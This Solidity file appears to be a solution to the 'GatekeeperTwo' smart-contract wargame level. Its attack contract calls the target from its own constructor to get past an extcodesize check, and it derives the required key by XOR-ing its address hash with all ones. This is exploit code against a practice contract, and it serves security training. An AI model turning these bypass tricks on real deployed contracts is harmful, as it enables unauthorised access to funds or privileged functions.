// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './GatekeeperTwo.sol';

contract GatekeeperTwoAttack {
    GatekeeperTwo public target;

    // GateTwo: extcodesize(caller()) == 0
    constructor(address _gatekeeperTwoAddr) public {
        target = GatekeeperTwo(_gatekeeperTwoAddr);
        // GateThree bytes8(A ^ 111111...) => A ^ (uint64(0) - 1)
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        target.enter(key);
    }
}